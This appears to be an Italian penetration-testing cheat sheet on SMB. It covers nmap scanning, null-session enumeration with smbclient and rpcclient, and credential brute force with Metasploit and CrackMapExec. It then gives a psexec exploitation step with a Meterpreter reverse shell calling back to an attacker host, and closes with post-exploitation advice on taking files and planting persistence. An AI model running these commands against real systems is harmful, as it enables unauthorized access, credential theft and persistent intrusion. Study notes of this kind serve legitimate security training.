# SMB Enumeration & Exploitation

**SMB (Server Message Block)** è un protocollo di rete utilizzato principalmente in ambienti Windows per la condivisione di file, stampanti e risorse. <br>
Opera sulle porte `445/TCP` (moderno) e `139/TCP` (legacy via NetBIOS). SMB è spesso abilitato di default sulle reti aziendali, rendendolo un obiettivo critico per i penetration tester.

---

## Fase 1 – Scansione e Identificazione del Servizio

La prima fase prevede la scoperta del servizio SMB attivo sul target e la sua versione. Queste informazioni sono fondamentali per identificare vulnerabilità note.

Esegui una scansione delle porte comuni:
`nmap -p 139,445 <target>`

Per identificare la versione del servizio:
`nmap -sV -p 445 <target>`

Script NSE utili:
- `nmap --script smb-os-discovery <target>` → sistema operativo, dominio, NetBIOS
- `nmap --script smb-enum-shares <target>` → condivisioni disponibili
- `nmap --script smb-enum-users <target>` → utenti configurati sul dominio

Verifica la versione con:
- `use auxiliary/scanner/smb/smb_version` (Metasploit)

Alcuni server SMB espongono versioni del servizio con vulnerabilità note. <br>
Versioni note:
- **SMBv1** → vulnerabile a EternalBlue (MS17-010)
- **Windows XP/2003/7 non patchati** → buffer overflow
- **vsrvsvc** → vulnerabilità nei servizi RPC

---

## Fase 2 – Enumerazione Manuale del Servizio

### smbclient

Client interattivo simile a FTP:
- `smbclient -L //<target>/ -N` → elenca le condivisioni accessibili senza credenziali
- `smbclient //<target>/<share> -N` → accede a una condivisione

Comandi utili all'interno della share:
- `ls`, `get`, `put`, `cd`, `mkdir`, `rmdir`

### enum4linux

Strumento versatile basato su `smbclient`, `rpcclient` e `nmblookup`:
- `enum4linux -a <target>` → enumerazione completa (utenti, gruppi, share, policy)

### rpcclient

Consente di connettersi ai servizi RPC tramite SMB:
- `rpcclient -U "" <IP>` → login null
- Comandi utili: `enumdomusers`, `enumdomgroups`, `queryuser <RID>`

---

## Fase 3 – Verifica Null Session

Una null session è una connessione SMB non autenticata che consente di leggere informazioni sensibili.

Per verificare:
- `rpcclient -U "" <target>`
- `smbclient -L //<target>/ -N`

Se la connessione ha successo, è possibile estrarre:
- Nomi utenti
- Share
- Informazioni sul dominio

---

## Fase 4 – Brute Force delle Credenziali

### Con Metasploit

`use auxiliary/scanner/smb/smb_login`<br>
`set RHOSTS <IP>`<br>
`set USER_FILE <lista_username.txt>`<br>
`set PASS_FILE <lista_passwords.txt>`<br>
`run`<br>

### Con CrackMapExec

- `crackmapexec smb <target> -u <user> -p <password>` → verifica credenziali
- `crackmapexec smb <target> --shares` → elenca le condivisioni
- `crackmapexec smb <target> --users` → enumera utenti

---

## Fase 5 – Exploitation

### Metasploit – Modulo PsExec

Se si dispone di credenziali valide:

`use exploit/windows/smb/psexec`<br>
`set RHOSTS <IP>`<br>
`set SMBUser <username>`<br>
`set SMBPass <password>`<br>
`set PAYLOAD windows/meterpreter/reverse_tcp`<br>
`set LHOST <KaliIP>`<br>
`set LPORT <Port>`<br>
`run`<br>

Questo modulo consente di ottenere una shell Meterpreter remota. Comandi utili:
- `getuid`
- `shell`
- `search -f <file>`

### Impacket – psexec.py

Alternativa Python per autenticarsi ed eseguire comandi da remoto:

`psexec.py <username>@<IP> cmd.exe`

Percorso: `/usr/share/doc/python3-impacket/examples/psexec.py`

Dopo aver fornito la password corretta, si ottiene un accesso CMD remoto con i privilegi dell’utente autenticato.

---

## Fase 6 – Post Exploitation

Dopo aver ottenuto accesso al sistema:
- Scarica file interessanti (`.txt`, `.conf`, `.xml`, `.ini`, `.bak`)
- Carica payload o script di persistence
- Verifica se le share sono usate da processi attivi o servizi web

Strumenti utili:
- `wget smb://<IP>`
- `curl smb://<IP>`
- `lftp <IP>`
